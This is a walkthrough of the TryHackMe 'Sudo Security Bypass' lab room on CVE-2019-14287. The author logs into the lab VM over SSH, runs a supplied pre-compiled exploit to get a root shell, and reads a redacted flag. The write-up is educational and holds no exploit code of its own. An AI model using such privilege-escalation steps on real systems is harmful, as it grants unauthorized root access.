# Sudo Security Bypass

## Room
This a Try Hack Me room called `Sudo Security Bypass` 

The Web address for this room is
https://tryhackme.com/room/sudovulnsbypass

## Synopsis.
A tutorial room exploring CVE-2019-14287 in the Unix Sudo Program. Room One in the SudoVulns Series


---

## Getting started

Make sure you are connected to the Try Hack Me VPN before starting!

The first thing I do when starting a room is to note the victim and attacker's IP as given by Try Hack Me.

```
export MYIP=10.9.9.10
export IP=10.10.10.10
```

This format allows me to copy and paste in any terminal and use `$IP` anytime I need the victim's IP or `$MYIP` if I need my own

---

## Task 1 - Deploy!

This room is very beginner friendly. Enjoy the read, hit deploy, go.

---

## Task 2 - Security Bypass

I highly recommend reading through the explanations before getting started with the rest. You will find it very useful.

### #1 - Use the pre-compiled exploit in the VM to get a root shell.

We are told to SSH to the machine:
```
port: 4444
Username: tryhackme
Password: tryhackme
```

This gives us the following command:
```
ssh -p 4444 tryhackme@$IP
```

Once we are in, we should find the exploit that has been uploaded.
```
ls
	exploit
```

Running a script is done by referring to its name directly. We use `./` to reffer to the current directory
```
./exploit
```

You don't need to do anything else, the password prompt will automatically return an error and you'll notice your shell has changed...
```
# whoami
root
```

We are now root!

### #2 - What's the flag in /root/root.txt?

And now, for the easy part, get the root.txt file in the root folder:
```
cd /root
ls
cat root.txt
THM{xxxxxx_xxxxxxx_xxxxx}
```

This was a great learning experience!
